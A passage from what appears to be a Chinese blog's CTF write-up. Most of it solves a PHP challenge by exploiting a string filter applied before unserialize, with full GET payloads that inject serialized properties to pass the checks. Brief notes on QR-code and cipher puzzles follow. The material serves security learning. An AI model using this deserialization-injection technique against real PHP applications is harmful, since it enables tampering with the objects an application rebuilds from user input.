class-name\">Foo1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a2</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token variable\">$msg1</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'C1CTF_IS_FUN'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'HFUT'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$foo1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token variable\">$msg2</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'C1CTF_IS_FUN'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'HFUT'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$foo2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    <span class=\"token variable\">$foo_ultimate1</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token variable\">$foo_ultimate2</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$foo_ultimate1</span><span class=\"token operator\">-></span><span class=\"token property\">test</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'HFUT'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$foo_ultimate1</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$foo_ultimate1</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$foo_ultimate2</span><span class=\"token operator\">-></span><span class=\"token property\">test</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'HFUT'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$foo_ultimate2</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$foo_ultimate2</span><span class=\"token operator\">-></span><span class=\"token property\">space</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you fuxking doing??\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>代码分析得最重要部分为后半部分的</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$msg1</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'C1CTF_IS_FUN'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'HFUT'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$foo1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg2</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'C1CTF_IS_FUN'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'HFUT'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$foo2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$foo_ultimate1</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$foo_ultimate2</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$foo_ultimate1</span><span class=\"token operator\">-></span><span class=\"token property\">test</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'HFUT'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$foo_ultimate1</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$foo_ultimate1</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$foo_ultimate2</span><span class=\"token operator\">-></span><span class=\"token property\">test</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'HFUT'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$foo_ultimate2</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$foo_ultimate2</span><span class=\"token operator\">-></span><span class=\"token property\">space</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you fuxking doing??\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>看到字符串过滤，很容易想到字符串逃逸，</p>\n<h3 id=\"对第一个-if-判断\"><a class=\"anchor\" href=\"#对第一个-if-判断\">#</a> 对第一个 if 判断</h3>\n<p>这里的主要思想为：当 <code>$a</code>  的字符串比较长时，通过过滤，字符串缩短，使得后面的 <code>$b</code>  的一部分值包含在变量 a 的序列化中，即如 <code>s:1:&quot;b&quot;;s:59:&quot;</code>  包含在其中，使得 b 的序列化并未开始，由于此时冒号后面可自动添加序列化字符串，那么可在原 b 变量上加上需要满足条件的序列化字符串，即 <code>s:1:&quot;a&quot;;s:0:&quot;&quot;;s:4:&quot;test&quot;;s:4:&quot;HFUT&quot;;s:1:&quot;b&quot;;s:0:&quot;&quot;;</code> , 为了能够使其序列化成功，可在最后加上 <code>&#125;</code> ，使其提前结束。</p>\n<p>那么接下来的主力工作是要让 a 的序列化字符串长度在过滤后恰能到达 b 的字符串值的前引号的位置，由于对 space 无要求，在以上分析中，只需 a 在 b 前即可，即可选用 Foo1，Foo3，Foo4 三个类，这里采用 Foo4</p>\n<p>首先输入空值进行序列化操作，得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Foo4\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"nonono\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"space\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">N</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>计算从 a 的值的后引号到 b 的值的前引号的长度，发现为 39 个，不是 12-4=8 的倍数，为了满足，可在 b 的值开头加上任意一个字符 (这里使用双引号)，使到其位置恰为 40 个，为 8 的 5 倍，那么 a 的值应为 5 个  <code>C1CTF_IS_FUN</code> ，据此，前半部分 payload 为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a1<span class=\"token operator\">=</span><span class=\"token constant\">C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN</span><span class=\"token operator\">&amp;</span>b1<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\";s:1:\"</span>a<span class=\"token string double-quoted-string\">\";s:0:\"</span><span class=\"token string double-quoted-string\">\";s:4:\"</span>test<span class=\"token string double-quoted-string\">\";s:4:\"</span><span class=\"token constant\">HFUT</span><span class=\"token string double-quoted-string\">\";s:1:\"</span>b<span class=\"token string double-quoted-string\">\";s:0:\"</span>\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"对第二个-if-判断\"><a class=\"anchor\" href=\"#对第二个-if-判断\">#</a> 对第二个 if 判断</h3>\n<p>同理，通过 a 的序列化字符串覆盖部分 b 的值</p>\n<p>那么根据第一个的分析 a 必须在 b 的前面，而在第二个判断中对 space 有要求，那么 space 必须在 a 的后面 (此前试过在前面，无法正常序列化)。因此，可选择的类有 Foo3、Foo4，由于对于 Foo4 来说，此时的判断只是增加了对 space 的赋值，只会对 b2 的赋值有影响，所以如果选用 Foo4 ，a2 的值仍为 5 个 <code>C1CTF_IS_FUN</code> ，而对 Foo3 来说，中间少了 test 的序列化字符串，后引号到前引号的长度有所改变，要重新计算  <code>C1CTF_IS_FUN</code>  的个数并凑齐倍数，所以为了方便这里还是使用 Foo4 由于此时对 a 的值无要求，对 space 有要求，因此此时 <code>b2=&quot;;s:4:&quot;test&quot;;s:4:&quot;HFUT&quot;;s:1:&quot;b&quot;;s:0:&quot;&quot;;s:5:&quot;space&quot;;s:0:&quot;&quot;;&#125;</code>  故后半部分 payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a2<span class=\"token operator\">=</span><span class=\"token constant\">C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN</span><span class=\"token operator\">&amp;</span>b2<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\";s:4:\"</span>test<span class=\"token string double-quoted-string\">\";s:4:\"</span><span class=\"token constant\">HFUT</span><span class=\"token string double-quoted-string\">\";s:1:\"</span>b<span class=\"token string double-quoted-string\">\";s:0:\"</span><span class=\"token string double-quoted-string\">\";s:5:\"</span>space<span class=\"token string double-quoted-string\">\";s:0:\"</span>\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>故最后的 payload</p>\n<p><strong>GET</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a1<span class=\"token operator\">=</span><span class=\"token constant\">C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN</span><span class=\"token operator\">&amp;</span>b1<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\";s:1:\"</span>a<span class=\"token string double-quoted-string\">\";s:0:\"</span><span class=\"token string double-quoted-string\">\";s:4:\"</span>test<span class=\"token string double-quoted-string\">\";s:4:\"</span><span class=\"token constant\">HFUT</span><span class=\"token string double-quoted-string\">\";s:1:\"</span>b<span class=\"token string double-quoted-string\">\";s:0:\"</span><span class=\"token string double-quoted-string\">\";&#125;&amp;a2=C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN&amp;b2=\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"HFUT\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"space\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>SESSION</strong></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>choice1 &#x3D; Foo4</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>choice2 &#x3D; Foo4</pre></td></tr></table></figure><h3 id=\"同理第二个使用-foo3\"><a class=\"anchor\" href=\"#同理第二个使用-foo3\">#</a> 同理，第二个使用 Foo3</h3>\n<p>先空字符序列化，得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Foo3\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"space\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">N</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"nonono\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>只有 15 个字符，那么只需要 2 个 <code>C1CTF_IS_FUN</code> ,b 添加一个字符即可，故 payload 为</p>\n<p><strong>GET</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a1<span class=\"token operator\">=</span><span class=\"token constant\">C1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUNC1CTF_IS_FUN</span><span class=\"token operator\">&amp;</span>b1<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\";s:1:\"</span>a<span class=\"token string double-quoted-string\">\";s:0:\"</span><span class=\"token string double-quoted-string\">\";s:4:\"</span>test<span class=\"token string double-quoted-string\">\";s:4:\"</span><span class=\"token constant\">HFUT</span><span class=\"token string double-quoted-string\">\";s:1:\"</span>b<span class=\"token string double-quoted-string\">\";s:0:\"</span><span class=\"token string double-quoted-string\">\";&#125;&amp;a2=C1CTF_IS_FUNC1CTF_IS_FUN&amp;b2=\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"HFUT\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"space\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>SESSION</strong></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>choice1 &#x3D; Foo4</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>choice2 &#x3D; Foo3</pre></td></tr></table></figure><p>同理，对于第一个类的更换也是如此进行</p>\n<h2 id=\"baby-php\"><a class=\"anchor\" href=\"#baby-php\">#</a> baby php</h2>\n<h2 id=\"baby-calculator\"><a class=\"anchor\" href=\"#baby-calculator\">#</a> baby calculator</h2>\n<h2 id=\"real-calculator\"><a class=\"anchor\" href=\"#real-calculator\">#</a> real calculator</h2>\n<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h1>\n<h2 id=\"bigjpg\"><a class=\"anchor\" href=\"#bigjpg\">#</a> bigjpg</h2>\n<h2 id=\"音乐带师\"><a class=\"anchor\" href=\"#音乐带师\">#</a> 音乐带师</h2>\n<h2 id=\"osint\"><a class=\"anchor\" href=\"#osint\">#</a> osint</h2>\n<h2 id=\"幸运饼干\"><a class=\"anchor\" href=\"#幸运饼干\">#</a> 幸运饼干</h2>\n<h2 id=\"signin\"><a class=\"anchor\" href=\"#signin\">#</a> signin</h2>\n<p>AES 解密</p>\n<h2 id=\"qrcode\"><a class=\"anchor\" href=\"#qrcode\">#</a> qrcode</h2>\n<p>下载得到的 rar 是损坏文件，用 winhex 将第一行第三个改为 <code>72</code> ，保存解压， 得到一个图片和一个 txt 文件。打开图片发现图片一闪一闪。那么将该图片用 ps 打开， 到对应图层，发现二维码部分缺失，这时用仿制图章将左下角分别复制到左上和右上，扫描后得到 flag</p>\n<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h2 id=\"嘀嘀嘀\"><a class=\"anchor\" href=\"#嘀嘀嘀\">#</a> 嘀嘀嘀</h2>\n<p>点开题目首先确认为摩斯密码，解码后得到一串字母，因题目提示栅栏，故栅栏解密， 当组字数为 8 时，注意到从右往左为 &quot;flagis.....&quot;, 由此写程序反转字符串，再将 flag 内容与 flag 格式结合得到 flag</p>\n",
            "tags": [
                "CTF",
                "笔记"
            ]
        }
    ]
}